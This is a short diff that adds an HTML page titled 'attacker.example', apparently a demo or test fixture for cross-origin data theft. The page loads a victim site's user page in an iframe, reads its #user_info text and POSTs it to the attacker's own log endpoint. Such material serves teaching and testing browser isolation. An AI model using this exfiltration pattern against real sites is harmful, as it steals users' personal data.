@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>attacker.example</title>
+    <script>
+      function load() {
+        const userInfo = frm.document.querySelector("#user_info");
+        fetch("./log", { method: "POST", body: userInfo.textContent });
+      }
+    </script>
+  </head>
+
+  <body>
+    <div></div>
+
+    <iframe name="frm" onload="load()" src="https://site.example/user.html">
+  </body>
+</html>
